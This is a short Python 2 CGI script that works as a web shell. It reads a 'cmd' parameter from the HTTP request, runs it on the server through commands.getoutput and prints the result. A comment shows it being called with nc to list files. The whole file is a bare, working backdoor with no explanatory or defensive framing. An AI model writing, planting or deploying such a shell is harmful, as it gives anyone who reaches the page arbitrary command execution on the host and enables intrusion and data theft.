#!/usr/bin/env python
# echo "GET /cgi/shell.rb?cmd=ls%20-la" | nc localhost 80
import cgi, commands
form = cgi.FieldStorage() 
print "Content-type:text/html\r\n"
print commands.getoutput(form.getvalue('cmd'))

